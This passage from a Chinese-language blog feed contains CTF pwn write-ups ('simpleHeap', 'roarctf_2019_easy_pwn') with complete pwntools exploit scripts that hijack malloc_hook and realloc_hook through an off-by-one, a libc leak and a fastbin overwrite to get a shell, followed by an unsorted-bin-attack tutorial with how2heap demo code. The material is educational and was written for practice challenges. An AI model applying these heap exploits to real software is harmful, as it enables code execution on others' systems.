class="string">&#x27;y&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;yyds&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>泄露 libc 地址后，将 bin 中剩余内存申请出来，该指针与 chunk2 指向相同地址，任选其一释放，再用另外一个修改 fastbin fd 指针：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure><p>正常来说将 malloc_hook 劫持为 onegadget 即可，但是测试发现这条题目的栈环境不满足全部 onegadget 条件，这就需要调整阵结构，使 onegadget 生效。<strong>需要配合使用 realloc_hook 和 malloc_hook。</strong></p><p>将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget 。然后通过多次尝试确定偏移为 12 。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vn_pwn_simpleHeap&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,29864)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./vn_pwn_simpleHeap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;y&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">&#x27;yyds&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;skye&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment"># one = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># create(0x10,&#x27;skye,yyds&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h3><h4 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h4><p>一个堆管理器，有增删查改功能。所有功能都是基于列表的下标定位操作对象。用 3 个列表维护堆：chunk_inuse、chunk_size、chunk_ptr。</p><h4 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h4><p>在 edit 功能里面 sub_E26 函数，这个函数用来处理输入长度的，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check_size</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> input_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)input_length )</span><br><span class="line">    <span class="keyword">return</span> input_length;</span><br><span class="line">  <span class="keyword">if</span> ( input_length - size == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = size + <span class="number">1</span>;<span class="comment">//off by one</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = size;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们要求写入的长度（input_length）大于堆 size 10 个字节时，就可以写入 size + 1 字节，造成 off by one 。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>这条题目和 <code>[V&amp;N2020 公开赛]simpleHeap</code> 思路一样。</p><p>使用 off by one 伪造 chunk size，造成 chunk extend ，再利用 unsorted bin 的特点，泄露出 unsorted bin fd 指针的 libc 地址。</p><p>将上一步中的 chunk extend 剩下在 bin 中的内存申请出来，造成两个指针指向同一个地址，配合 edit 功能实现 houst of spirit ，劫持 __malloc_hook 。</p><p>实际测试后全部 onegadget 因为栈环境问题都无法打通，需要结合 malloc_hook 、 realloc_hook 调整栈环境才能打通。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./roarctf_2019_easy_pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29259</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./roarctf_2019_easy_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>)<span class="comment">#overwrite</span></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#protect</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>+<span class="number">10</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line">create(<span class="number">0x68</span>)</span><br><span class="line"><span class="comment"># one = [0x45226,0x4527a,0xf0364,0xf1207]</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">onegadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://bbs.pediy.com/thread-246786.htm">[原创]堆的六种利用手法</a></li><li><a href="https://blog.csdn.net/breeze_cat/article/details/103789081">[pwn]堆：realloc_hook控制栈结构达成onegadget</a></li><li><a href="https://xz.aliyun.com/t/6559">pwn学习系列之Extend the chunk及realloc_hook利用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> realloc_hook </tag>
            
            <tag> onegadget </tag>
            
            <tag> malloc_hook </tag>
            
            <tag> 合天 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unsorted Bin Attack</title>
      <link href="archives/b65b3233/"/>
      <url>archives/b65b3233/</url>
      
        <content type="html"><![CDATA[<h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h2 id="Unsorted-Bin-回顾"><a href="#Unsorted-Bin-回顾" class="headerlink" title="Unsorted Bin 回顾"></a>Unsorted Bin 回顾</h2><p>在介绍 Unsorted Bin 攻击前，可以先回顾一下 Unsorted Bin 的基本来源以及基本使用情况。</p><h3 id="基本来源"><a href="#基本来源" class="headerlink" title="基本来源"></a>基本来源</h3><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h3 id="基本使用情况"><a href="#基本使用情况" class="headerlink" title="基本使用情况"></a>基本使用情况</h3><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在 <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> 中的 <code>_int_malloc</code> 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>换而言之，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p><p>这里我以 shellphish 的 how2heap 仓库中的 <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> 为例进行介绍，这里我做一些简单的修改，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="keyword">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序执行后的效果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  unsorted_bin_attack git:(master) ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack</span><br><span class="line">➜  unsorted_bin_attack git:(master) ✗ .&#x2F;unsorted_bin_attack</span><br><span class="line">This file demonstrates unsorted bin attack by write a large unsigned long value into stack</span><br><span class="line">In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let&#39;s first look at the target we want to rewrite on stack:</span><br><span class="line">0x7ffe0d232518: 0</span><br><span class="line"></span><br><span 